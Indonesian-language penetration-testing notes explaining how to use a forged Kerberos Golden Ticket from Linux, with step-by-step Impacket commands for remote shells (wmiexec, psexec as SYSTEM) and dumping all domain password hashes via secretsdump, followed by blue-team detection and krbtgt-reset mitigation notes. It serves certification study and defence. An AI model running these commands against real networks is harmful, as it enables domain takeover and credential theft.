# Kerberos Post-Exploitation: Golden Ticket Access from Linux

Catatan taktis mengenai cara menggunakan **Golden Ticket (TGT)** yang telah diekstrak atau dibuat, untuk melakukan penetrasi dan mengakses mesin Windows (Active Directory) langsung dari sistem operasi Linux tanpa menyentuh *password* korban.

---

## 📋 Prasyarat & Persiapan Lingkungan

Sebelum mengeksekusi tiket Kerberos dari Linux, pastikan komponen dasar ini dikonfigurasi dengan benar karena Kerberos sangat sensitif terhadap **waktu** dan **resolusi DNS**.

### 1. Sinkronisasi Waktu (NTP)
Kerberos akan menolak tiket jika selisih waktu antara mesin Linux Anda dan Domain Controller (DC) lebih dari **5 menit**.
```bash
sudo ntpdate <IP_DOMAIN_CONTROLLER>
```

### 2. Resolusi Nama Domain (DNS Mapping)
Kerberos tidak dapat memproses alamat IP secara langsung. Anda harus memetakan FQDN (*Fully Qualified Domain Name*) target ke dalam file `/etc/hosts`.
```bash
echo "<IP_DOMAIN_CONTROLLER> dc01.perusahaan.local perusahaan.local" | sudo tee -a /etc/hosts
```

---

## 🛠️ Langkah Demi Langkah Eksekusi

### Langkah 1: Konversi Format Tiket (Jika Diperlukan)
Jika tiket yang Anda miliki berasal dari Mimikatz (Windows) berformat `.kirbi`, konversikan terlebih dahulu ke format `.ccache` agar bisa dibaca oleh *tooling* Linux (Impacket).

```bash
impacket-ticketConverter tiket_anda.kirbi tiket_anda.ccache
```

### Langkah 2: Registrasi Tiket ke Memori Sesi Linux
Muat file tiket `.ccache` ke dalam *environment variable* sistem Linux agar dapat digunakan secara otomatis oleh perintah selanjutnya.

```bash
export KRB5CCNAME=/path/to/tiket_anda.ccache
```
> 💡 *Tips: Periksa apakah tiket sudah terbaca di sistem Anda dengan mengetik perintah `klist`.*

### Langkah 3: Lateral Movement / Remote Access (Tanpa Password)
Gunakan salah satu taktik di bawah ini menggunakan **Impacket suite**. Kunci utamanya adalah menggunakan parameter `-k` (Gunakan Kerberos dari variabel `$KRB5CCNAME`) dan `-no-pass` (Abaikan otentikasi password).

#### Opsi A: Mengambil Kendali Command Prompt (Semi-Stealth)
Menggunakan protokol WMI (`wmiexec.py`), metode ini lebih senyap karena tidak menjatuhkan file biner ke target.
```bash
impacket-wmiexec -k -no-pass perusahaan.local/UserPalsu@dc01.perusahaan.local
```

#### Opsi B: Mendapatkan Akses Shell SYSTEM (PsExec)
Menggunakan `psexec.py` untuk mendapatkan interaksi *shell* dengan hak akses tertinggi (`NT AUTHORITY\SYSTEM`).
```bash
impacket-psexec -k -no-pass perusahaan.local/UserPalsu@dc01.perusahaan.local
```

#### Opsi C: Eksfiltrasi Database Password (SecretsDump)
Jika ingin langsung mengambil seluruh *hash* password pengguna dari *Active Directory* (`ntds.dit`) dari jarak jauh.
```bash
impacket-secretsdump -k -no-pass perusahaan.local/UserPalsu@dc01.perusahaan.local
```

---

## 🛡️ Catatan Deteksi & Mitigasi (Blue Team)
Bagi praktisi pertahanan, aktivitas serangan menggunakan teknik ini dapat diidentifikasi melalui:
* **Windows Event Log ID 4624 / 4768**: Memperlihatkan otentikasi dengan masa berlaku tiket yang tidak wajar (misal: 10 tahun).
* **Anomali Enkripsi**: Penggunaan tipe enkripsi yang lemah atau tidak sesuai standar operasional jaringan saat tiket diajukan.
* **Solusi Mutlak**: Lakukan prosedur **2x Reset Password Akun `krbtgt`** untuk membatalkan seluruh Golden Ticket yang telah beredar.

---
*Disclaimer: Catatan ini dibuat murni untuk dokumentasi edukasi, persiapan sertifikasi (OSCP/PNPT), dan simulasi uji pengetesan resmi (Authorized Pentesting).*
